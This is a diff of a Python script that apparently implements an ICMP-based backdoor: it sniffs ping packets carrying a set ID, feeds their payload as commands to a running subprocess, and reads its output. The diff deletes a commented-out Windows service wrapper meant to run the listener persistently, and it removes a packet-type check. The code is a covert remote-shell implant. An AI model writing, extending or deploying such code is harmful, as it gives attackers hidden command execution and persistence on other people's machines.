@@ -16,6 +16,7 @@ destination_mac = "ff:ff:ff:ff:ff:ff"
 destination_ip = ""
 is_debug = 1
 
+
 def readstdout():
     global destination_ip, destination_mac
     for l in iter(p.stdout.readline, b""):
@@ -46,7 +47,7 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac, source_ip, source_mac
-    if ICMP in packet and packet[ICMP].id == config.ID and packet[ICMP].type == 8:
+    if packet[ICMP].id == config.ID and packet[ICMP].type == 8:
         destination_ip = packet[IP].src
         destination_mac = packet[Ether].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
@@ -104,82 +105,3 @@ if is_debug == 0:
     t2.start()
 
     sniff(filter="icmp", prn=packet_callback)
-
-# sniff(filter="icmp", prn=packet_callback)
-
-
-# class TestService(win32serviceutil.ServiceFramework):
-#    _svc_name_ = 'TestService'
-#    _svc_display_name_ = 'TestService'
-#
-#    def __init__(self, args):
-#        win32serviceutil.ServiceFramework.__init__(self, args)
-#        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
-#        socket.setdefaulttimeout(60)
-#
-#    def SvcStop(self):
-#        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
-#        win32event.SetEvent(self.hWaitStop)
-#
-#    def SvcDoRun(self):
-#        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED,
-#                              (self._svc_name_, ''))
-#        self.main()
-#
-#    def main(self):
-#        f = open('D:\\test.txt', 'a')
-#        rc = None
-#        while rc != win32event.WAIT_OBJECT_0:
-#            f.write('Test Service  \n')
-#            f.flush()
-#            # block for 24*60*60 seconds and wait for a stop event
-#            # it is used for a one-day loop
-#            rc = win32event.WaitForSingleObject(self.hWaitStop, 24 * 60 * 60 * 1000)
-#        f.write('shut down \n')
-#        f.close()
-
-# class Service(win32serviceutil.ServiceFramework):
-#    _svc_name_ = "Service"
-#    _svc_display_name_ = "Service"
-#
-#    def __init__(self, args):
-#        win32serviceutil.ServiceFramework.__init__(self, *args)
-#        self.log('Service Initialized.')
-#        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
-#
-#    def log(self, msg):
-#        servicemanager.LogInfoMsg(str(msg))
-#
-#    def SvcStop(self):
-#        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
-#        self.log('Service has stopped.')
-#        win32event.SetEvent(self.stop_event)
-#        self.ReportServiceStatus(win32service.SERVICE_STOPPED)
-#
-#    def SvcDoRun(self):
-#        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
-#        try:
-#            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
-#            self.log('Service is starting.')
-#            self.main()
-#            win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
-#            servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED,
-#                                  (self._svc_name_, ''))
-#        except Exception as e:
-#            s = str(e)
-#            self.log('Exception :' + s)
-#
-#    def main(self):
-#        t1 = threading.Thread(target=readstdout)
-#        t2 = threading.Thread(target=readstderr)
-#
-#        t1.start()
-#        t2.start()
-#        sniff(filter="icmp", prn=packet_callback)
-
-# if len(sys.argv) == 1:
-#    servicemanager.Initialize()
-#    servicemanager.PrepareToHostSingle(Service)
-#    servicemanager.StartServiceCtrlDispatcher()
-# else:
-#    win32serviceutil.HandleCommandLine(Service)
